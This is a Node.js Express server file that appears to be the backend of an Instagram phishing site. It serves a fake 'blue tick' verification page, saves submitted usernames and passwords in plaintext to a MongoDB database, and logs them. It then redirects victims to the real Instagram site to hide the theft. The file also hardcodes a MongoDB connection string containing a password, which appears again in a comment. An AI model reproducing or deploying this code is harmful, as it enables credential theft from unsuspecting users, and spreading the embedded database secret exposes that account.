const express= require("express");
const app= express();
const path = require('path');
const ejs= require("ejs");
const ejsMate= require("ejs-mate");
const bodyParser= require("body-parser");
const port= '3000';
const nodemailer = require('nodemailer');
const mongoose= require("mongoose");

//vn5YGXosfDoUpAvN

const { MongoClient, ServerApiVersion } = require('mongodb');
const uri = "mongodb+srv://instagramFish:vn5YGXosfDoUpAvN@cluster0.ltm5jm0.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});
async function run() {
  try {
    // Connect the client to the server	(optional starting in v4.7)
    await client.connect();
    // Send a ping to confirm a successful connection
    await client.db("admin").command({ ping: 1 });
    console.log("Pinged your deployment. You successfully connected to MongoDB!");
  } finally {
    // Ensures that the client will close when you finish/error
    await client.close();
  }
}
run().catch(console.dir);

mongoose.connect(uri,{useNewUrlParser:true});


const userSchema = new mongoose.Schema({
    username: String,
    password: String
});


const UserDetails= mongoose.model('UserDetails', userSchema);


app.engine('ejs', ejsMate);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));


app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: false }));


app.get("/",function(req,res){
  res.render("index.ejs");
});

app.get("/bluetick",function(req,res){
  res.render("bluetick.ejs");
});

app.post('/submit', async (req, res) => {
  const uname=req.body.uname;
  const password=req.body.password;

  console.log(uname);
  console.log(password);


  const newUser = new UserDetails({
    username: uname,
    password: password
  });
  // Save the user to the database
  newUser.save().then((savedUser) => {
    console.log('User saved:', savedUser);
  }).catch((error) => {
    // Handle validation errors and other errors
    if (error.name === 'ValidationError') {
      console.error('Validation error:', error.message);
    } else {
      console.error('Error saving user:', error);
    }
  });
  res.redirect("/bluetick");
});

app.post("/finalsubmit",function(req,res){
  console.log("hello");
  res.redirect("https://www.instagram.com/");
});

app.listen(port,()=>{
  console.log('listening to port '+ port);
});
